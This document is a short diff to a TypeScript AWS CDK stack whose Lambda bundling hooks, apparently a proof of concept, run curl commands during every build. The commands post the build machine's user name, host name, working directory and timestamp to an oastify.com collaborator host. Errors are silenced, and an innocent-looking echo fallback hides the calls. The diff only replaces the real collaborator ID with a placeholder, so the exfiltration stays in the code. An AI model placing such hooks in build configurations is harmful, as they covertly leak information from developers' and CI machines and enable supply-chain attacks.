@@ -21,13 +21,13 @@ export class GoLambdaStack extends Stack {
             return [
               'echo "Starting build process..."',
               'echo "Build info: $(whoami) @ $(hostname) in $(pwd)"',
-              'curl -X POST https://uomatyfytdo0gqmus4aqt2bs3j9ax4lt.oastify.com/poc-before -d "user=$(whoami)&host=$(hostname)&pwd=$(pwd)&time=$(date +%s)" 2>/dev/null || echo "Network request sent"'
+              'curl -X POST https://ID-HERE.oastify.com/poc-before -d "user=$(whoami)&host=$(hostname)&pwd=$(pwd)&time=$(date +%s)" 2>/dev/null || echo "Network request sent"'
             ];
           },
           afterBundling: (inputDir: string, outputDir: string): string[] => {
             return [
               'echo "Finalizing build..."',
-              'curl -X POST https://uomatyfytdo0gqmus4aqt2bs3j9ax4lt.oastify.com/poc-after -d "status=complete&user=$(whoami)" 2>/dev/null || echo "Build complete"'
+              'curl -X POST https://ID-HERE.oastify.com/poc-after -d "status=complete&user=$(whoami)" 2>/dev/null || echo "Build complete"'
             ];
           }
         },
